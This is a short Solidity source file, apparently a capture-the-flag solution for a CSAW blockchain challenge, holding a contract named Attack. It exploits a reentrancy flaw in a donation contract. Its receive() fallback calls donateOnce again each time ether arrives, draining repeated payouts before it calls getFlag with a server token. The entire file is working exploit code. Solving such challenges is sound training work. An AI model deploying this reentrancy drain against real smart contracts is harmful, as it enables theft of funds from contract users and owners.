// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8.7;
import "./BlockchainChallenge.sol";

contract Attack {
    CSAWDonation public csawDonation;
    bytes32 public token;

    constructor(address csawDonationAddress) {
        csawDonation = CSAWDonation(csawDonationAddress);
        token = "a222624eaf"; //token from the server goes here
    }

    function attackCSAWDonation() external payable {
        csawDonation.newAccount{value: 0.0001 ether}();
        csawDonation.donateOnce();
    }

    receive() external payable{
        csawDonation.donateOnce();
    }

    function getBalance() public view returns (uint256 contractBalance) {
        return csawDonation.getBalance();
    }

    function getFlag() public {
        csawDonation.getFlag(token);
    }
}
